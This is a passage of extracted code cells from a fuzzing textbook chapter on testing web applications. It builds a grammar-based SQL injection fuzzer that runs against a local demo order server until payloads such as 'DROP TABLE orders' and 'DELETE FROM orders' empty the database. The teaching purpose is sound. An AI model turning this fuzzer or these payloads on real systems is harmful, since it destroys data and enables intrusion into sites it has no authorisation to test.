"```py\nhtml_miner = SQLInjectionGrammarMiner(\n    html_text, sql_payload=\"DROP TABLE orders\") \n```", "```py\ngrammar = html_miner.mine_grammar()\ngrammar \n```", "```py\n{'<start>': ['<action>?<query>'],\n '<string>': ['<letter>', '<letter><string>'],\n '<letter>': ['<plus>', '<percent>', '<other>'],\n '<plus>': ['+'],\n '<percent>': ['%<hexdigit-1><hexdigit>'],\n '<hexdigit>': ['0',\n  '1',\n  '2',\n  '3',\n  '4',\n  '5',\n  '6',\n  '7',\n  '8',\n  '9',\n  'a',\n  'b',\n  'c',\n  'd',\n  'e',\n  'f'],\n '<other>': ['0', '1', '2', '3', '4', '5', 'a', 'b', 'c', 'd', 'e', '-', '_'],\n '<text>': ['<string>', '<sql-injection-attack>'],\n '<number>': ['<digits>', '<sql-injection-attack>'],\n '<digits>': ['<digit>', '<digits><digit>'],\n '<digit>': ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],\n '<checkbox>': ['<_checkbox>', '<sql-injection-attack>'],\n '<_checkbox>': ['on', 'off'],\n '<email>': ['<_email>', '<sql-injection-attack>'],\n '<_email>': ['<string>%40<string>'],\n '<hexdigit-1>': ['3', '4', '5', '6', '7'],\n '<submit>': [''],\n '<sql-injection-attack>': [\"<string>'+<sql-values>)%3b+<sql-payload>%3b+<sql-comment>\",\n  \"<string>'+<sql-comment>\",\n  \"'+OR+1%3d1<sql-comment>'\",\n  '<number>+OR+1%3d1'],\n '<sql-values>': ['', \"<sql-values>,+'<string>'\"],\n '<sql-payload>': ['DROP+TABLE+orders'],\n '<sql-comment>': ['--', '#'],\n '<action>': ['/order'],\n '<item>': ['item=<item-value>'],\n '<item-value>': ['tshirt', 'drill', 'lockset'],\n '<name>': ['name=<text>'],\n '<email-1>': ['email=<email>'],\n '<city>': ['city=<text>'],\n '<zip>': ['zip=<number>'],\n '<terms>': ['terms=<checkbox>'],\n '<submit-1>': ['submit=<submit>'],\n '<query>': ['<item>&<name>&<email-1>&<city>&<zip>&<terms>&<submit-1>']}\n\n```", "```py\ngrammar[\"<text>\"] \n```", "```py\n['<string>', '<sql-injection-attack>']\n\n```", "```py\nsql_fuzzer = GrammarFuzzer(grammar)\nsql_fuzzer.fuzz() \n```", "```py\n\"/order?item=lockset&name=4+OR+1%3d1&email=%66%40%3ba&city=%7a&zip=99&terms=1'+#&submit=\"\n\n```", "```py\nprint(db.execute(\"SELECT * FROM orders\").fetchall()) \n```", "```py\n[]\n\n```", "```py\ncontents = webbrowser(urljoin(httpd_url,\n                              \"/order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104\")) \n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] INSERT INTO orders VALUES ('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104')\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104 HTTP/1.1\" 200 -\n\n```", "```py\ndef orders_db_is_empty():\n  \"\"\"Return True if the orders database is empty (= we have been successful)\"\"\"\n\n    try:\n        entries = db.execute(\"SELECT * FROM orders\").fetchall()\n    except sqlite3.OperationalError:\n        return True\n    return len(entries) == 0 \n```", "```py\norders_db_is_empty() \n```", "```py\nFalse\n\n```", "```py\nclass SQLInjectionFuzzer(WebFormFuzzer):\n  \"\"\"Simple demonstrator of a SQL Injection Fuzzer\"\"\"\n\n    def __init__(self, url: str, sql_payload : str =\"\", *,\n                 sql_injection_grammar_miner_class: Optional[type] = None,\n                 **kwargs):\n  \"\"\"Constructor.\n `url` - the Web page (with a form) to retrieve\n `sql_payload` - the SQL command to execute\n `sql_injection_grammar_miner_class` - the miner to be used\n (default: SQLInjectionGrammarMiner)\n Other keyword arguments are passed to `WebFormFuzzer`.\n \"\"\"\n        self.sql_payload = sql_payload\n\n        if sql_injection_grammar_miner_class is None:\n            sql_injection_grammar_miner_class = SQLInjectionGrammarMiner\n        self.sql_injection_grammar_miner_class = sql_injection_grammar_miner_class\n\n        super().__init__(url, **kwargs)\n\n    def get_grammar(self, html_text):\n  \"\"\"Obtain a grammar with SQL injection commands\"\"\"\n\n        grammar_miner = self.sql_injection_grammar_miner_class(\n            html_text, sql_payload=self.sql_payload)\n        return grammar_miner.mine_grammar() \n```", "```py\nsql_fuzzer = SQLInjectionFuzzer(httpd_url, \"DELETE FROM orders\")\nweb_runner = WebRunner(httpd_url)\ntrials = 1\n\nwhile True:\n    sql_fuzzer.run(web_runner)\n    if orders_db_is_empty():\n        break\n    trials += 1 \n```", "```py\ntrials \n```", "```py\n68\n\n```", "```py\norders_db_is_empty() \n```", "```py\nTrue\n\n```", "```py\nclear_httpd_messages() \n```", "```py\nhttpd_process.terminate() \n```", "```py\nimport [html](https://docs.python.org/3/library/html.html) \n```", "```py\n<input type=\"text\" pattern=\"[0-9][0-9][0-9][0-9][0-9]\"> \n```", "```py\n@incollection{fuzzingbook2024:WebFuzzer,\n    author = {Andreas Zeller and Rahul Gopinath and Marcel B{\\\"o}hme and Gordon Fraser and Christian Holler},\n    booktitle = {The Fuzzing Book},\n    title = {Testing Web Applications},\n    year = {2024},\n    publisher = {CISPA Helmholtz Center for Information Security},\n    howpublished = {\\url{https://www.fuzzingbook.org/html/WebFuzzer.html}},\n    note = {Retrieved 2024-01-31 17:32:56+01:00},\n    url = {https://www.fuzzingbook.org/html/WebFuzzer.html},\n    urldate = {2024-01-31 17:32:56+01:00}\n}\n\n```"]